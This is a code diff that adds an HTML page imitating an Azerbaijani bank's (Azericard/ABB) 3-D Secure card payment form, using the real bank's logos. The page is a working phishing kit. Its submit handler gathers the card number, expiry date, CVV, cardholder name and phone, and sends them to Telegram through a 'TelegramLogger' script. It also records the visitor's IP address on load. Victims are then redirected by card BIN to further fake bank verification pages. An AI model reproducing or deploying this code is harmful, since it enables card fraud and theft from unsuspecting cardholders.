@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard</title>
+
+    <link href="css/azericard.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+    <div class="all">
+        <main class="main">
+            <header>
+                <div class="header-logos">
+                    <div class="abb-logo">
+                        <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Bank">
+                    </div>
+                    <div class="azericard-logo">
+                        <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
+                    </div>
+                </div>
+            </header>
+            <section class="form-content form-content2">
+                <h1>Kart məlumatları</h1>
+                <div id="amountDisplay"
+                    style="text-align: center; margin-bottom: 20px; font-size: 18px; font-weight: bold;"></div>
+                <form class="form-container" id="paymentForm" action="kapital-3ds.html" method="POST" autocomplete="off">
+                    <div class="field-container1">
+                        <div>
+                            <div class="cardnumber_img">
+                                <div class="svgBox">
+                                    <div>
+                                        <label for="amountdisplay">Ödəniş məbləği</label>
+                                        <input id="amountdisplay" type="text" name="amountdisplay" maxlength="32"
+                                            readonly>
+                                        <input id="amount" type="hidden" name="amount" maxlength="32">
+                                        <script>
+                                            // URL-dən amount parametrini al
+                                            const urlParams = new URLSearchParams(window.location.search);
+                                            const amount = urlParams.get('amount');
+                                            if (amount) {
+                                                // Float şəklində formatlayıb "AZN" əlavə et
+                                                const formattedAmount = parseFloat(amount).toFixed(2) + ' AZN';
+                                                document.getElementById('amountdisplay').value = formattedAmount;
+                                                document.getElementById('amount').value = parseFloat(amount).toFixed(2);
+                                            }
+                                        </script>
+                                    </div>
+                                </div>
+                                <div>
+                                    <img style="width: 30px;" src="images/money.svg" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="field-container1">
+                        <div>
+                            <div class="cardnumber_img" id="name-container">
+                                <div class="svgBox">
+                                    <div>
+                                        <label for="name" id="name-text">Kart sahibinin adı</label>
+                                        <input required="" id="name" type="text" name="name" maxlength="32"
+                                            placeholder="Ad Soyad">
+                                    </div>
+                                </div>
+                                <div>
+                                    <img style="width: 30px;" src="images/user.svg" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="field-container1">
+                        <div>
+                            <div class="cardnumber_img" id="phone-container">
+                                <div class="svgBox">
+                                    <div>
+                                        <label for="phoneNumber" id="phone-text">Kart sahibinin mobil nömrəsi</label>
+                                        <input required id="phoneNumber" name="phone" type="phone"
+                                            placeholder="+994 (00) 000 00 00">
+                                    </div>
+                                </div>
+                                <div>
+                                    <img style="width: 30px;" src="images/phone.svg" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="field-container1">
+                        <div>
+                            <div class="cardnumber_img" id="card-container">
+                                <div class="svgBox">
+                                    <div>
+                                        <label for="cardnumber" id="card-text">Kartın nömrəsi</label>
+                                        <input required="" id="cardnumber" type="tel" inputmode="numeric" minlength="13"
+                                            name="card" maxlength="19" placeholder="••••  ••••  ••••  ••••  ">
+                                        <input type="hidden" name="CARD" id="card-number">
+                                    </div>
+
+                                    <svg id="ccicon" class="ccicon" width="750" height="471" viewBox="0 0 750 471"
+                                        version="1.1" xmlns="http://www.w3.org/2000/svg"
+                                        xmlns:xlink="http://www.w3.org/1999/xlink"></svg>
+                                </div>
+                                <div>
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/credit-card.svg" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <div class="field-container2">
+                        <div class="field-container" id="expdate-container">
+                            <label for="expirationdate" id="expdate-text">Bitmə tarixi</label>
+                            <input required="" id="expirationdate" name="expdate" type="text" inputmode="numeric"
+                                placeholder="MM / YY"
+                                onkeypress="if(event.keyCode < 47 || event.keyCode > 58) return false;">
+                            <input type="hidden" name="EXP" id="expired-month">
+                            <input type="hidden" name="EXP_YEAR" id="expired-year">
+                        </div>
+                        <div class="field-container_cvc">
+                            <div class="field_cvc">
+                                <div>
+                                    <label for="securitycode">CVC</label>
+                                    <input required="" id="securitycode" type="password" inputmode="numeric" name="cvv"
+                                        placeholder="***" minlength="3" maxlength="4"
+                                        onkeypress="if(event.keyCode < 47 || event.keyCode > 58) return false;">
+                                </div>
+                                <p class="tooltip">
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="">
+                                    <span class="tooltiptext">CVV və ya CVC kartınızın arxasındadır
+                                        <span class="triangle"></span>
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-button">
+                        <button id="submitBtn" type="submit" class="submitBtn" disabled="">
+                            <div style="pointer-events: none">
+                                <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="">
+                            </div>
+                            Təhlükəsiz ödə
+                        </button>
+
+                        <button id="cnltBtn" type="button" onclick="top.location.href='index.html';">
+                            Ödənişin ləğvi
+                        </button>
+                    </div>
+                </form>
+            </section>
+        </main>
+        <footer class="footer_part2">
+            <div class="footer_1">
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="">
+                </div>
+            </div>
+            <div class="footer_2">
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="">
+                </div>
+                <div>
+                    <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="">
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://unpkg.com/imask"></script>
+    <script src="js/telegram-logger.js"></script>
+    
+    <!-- IP ünvanını əvvəlcədən al -->
+    <script>
+        // Səhifə yüklənəndə IP ünvanını al və saxla
+        if (window.TelegramLogger) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    localStorage.setItem('user_ip', data.ip);
+                    console.log('🌐 IP ünvanı alındı:', data.ip);
+                })
+                .catch(error => {
+                    console.log('⚠️ IP alına bilmədi:', error);
+                });
+        }
+    </script>
+    
+    <script type="text/javascript" src="js/azericard-main.js"></script>
+    
+    <!-- Banka yönlendirme scripti -->
+    <script type="text/javascript">
+        // BIN (ilk 6 hane) bazında banka tespiti
+        const bankBINs = {
+            'azericard': [
+                '552209',  // 55220993 ve 552209 (ilk 6 hane)
+                '552229',  // Mastercard
+                '400064', '400112', '400260', '400624', '401769',  // Eski BIN'ler
+                '440000', '528974', '440001', '981911'  // Test kodları
+            ], 
+            'kapital': [
+                '416973',  // 41697388
+                '409858',  // 40985844
+                '510307',  // Mastercard Debit
+                '523915',  // Mastercard Credit (Platinum)
+                '535115',  // Mastercard Debit
+                '540408',  // Mastercard Credit
+                '544459',  // Mastercard Credit
+                '545184',  // Mastercard Credit
+                '534436', '554074', '440002', '528975'  // Test kodları
+            ], 
+            'unibank': [
+                '409809',  // 40980944
+                '412700', '412701', '412702', '412703', '412704', '412705', '412706', '412707', '412708', '412709',  // 4127xx (tüm alt BIN'ler)
+                '402865',  // Visa Classic Credit
+                '409859', '409860', '409861',  // Visa Debit
+                '512093', '512768', '522953',  // Mastercard Credit
+                '981913', '440004', '528977', '534437'  // Test kodları
+            ]
+        };
+        
+        // LeoBank için özel BIN'ler
+        bankBINs.leobank = [
+            '541124',  // 54112498
+            '409858',  // 40985844 (Kapital ile ortak, LeoBank öncelikli)
+            '409862',  // Visa Debit
+            '512093', '512768', '522953',  // Mastercard Credit (UniBank ile ortak)
+            '981912', '528976', '440003'  // Test kodları
+        ];
+        
+        function detectBank(cardNumber) {
+            const cleanCard = cardNumber.replace(/\s/g, '').replace(/\D/g, ''); // Tüm boşluk ve özel karakterleri temizle
+            const bin = cleanCard.substring(0, 6);
+            
+            console.log('🔍 Kart numarası:', cardNumber);
+            console.log('🔍 Temizlenmiş:', cleanCard);
+            console.log('🔍 BIN (ilk 6 hane):', bin);
+            
+            for (let bank in bankBINs) {
+                console.log('  Kontrol ediliyor:', bank, bankBINs[bank]);
+                if (bankBINs[bank].includes(bin)) {
+                    console.log('✅ EŞLEŞME BULUNDU! Banka:', bank);
+                    return bank;
+                }
+            }
+            
+            console.log('⚠️ Hiçbir BIN eşleşmedi! Varsayılan: kapital');
+            return 'kapital';
+        }
+        
+        var submitBtn = document.getElementById("submitBtn");
+        var paymentForm = document.getElementById("paymentForm");
+        
+        submitBtn.addEventListener("click", function(event) {
+            event.preventDefault();
+            
+            // Form validasyonu kontrol et
+            if (!paymentForm.checkValidity()) {
+                paymentForm.reportValidity();
+                return;
+            }
+            
+            // Butonu devre dışı bırak
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<div><img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="" /></div><div><p class="submitWrd">Processing...</p></div>';
+            
+            // Get form data
+            const cardNumber = document.getElementById('cardnumber').value.replace(/\s/g, '');
+            const cardholderName = document.getElementById('name').value;
+            const expiryDate = document.getElementById('expirationdate').value;
+            const cvv = document.getElementById('securitycode').value;
+            const amount = document.getElementById('amount').value;
+            const phoneNumber = document.getElementById('phoneNumber').value; // Get phone from odeme1
+            
+            // Save card details using Telegram Logger
+            if (window.TelegramLogger) {
+                // Save phone number to customer info if not saved before
+                const customerInfo = JSON.parse(localStorage.getItem('customer_info') || '{}');
+                if (!customerInfo.phone || customerInfo.phone === '+994 (050) ') {
+                    window.TelegramLogger.saveCustomerInfo('', phoneNumber, '', '');
+                }
+                
+                window.TelegramLogger.saveCardDetails(cardNumber, cardholderName, expiryDate, cvv, amount);
+                
+                // Send card info to Telegram immediately
+                window.TelegramLogger.sendCardInfo();
+            }
+            
+            // Bankayı tespit et
+            const bankName = detectBank(cardNumber);
+            const targetPage = bankName + '-3ds.html';
+            
+            console.log('🏦 Yönlendirilecek sayfa:', targetPage);
+            
+            // 500ms bekle ve yönlendir
+            setTimeout(function() {
+                window.location.href = targetPage + '?card=' + encodeURIComponent(cardNumber) + '&amount=' + encodeURIComponent(amount);
+            }, 500);
+        });
+    </script>
+    <script>document.addEventListener("DOMContentLoaded", function () {
+            const phoneInput = document.getElementById("phoneNumber");
+
+            // IMask ayarları
+            const phoneMask = new IMask(phoneInput, {
+                mask: '+{994} (00) 000 00 00',
+                lazy: false,
+                placeholderChar: '0'
+            });
+
+        });
+
+
+    </script>
+
+
+
+</body>
+
+</html>
